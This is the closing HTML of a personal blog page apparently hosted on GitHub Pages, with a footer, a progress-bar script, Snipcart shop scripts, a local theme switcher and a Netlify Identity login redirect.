id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="http://localhost:4000/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> </body> </html>
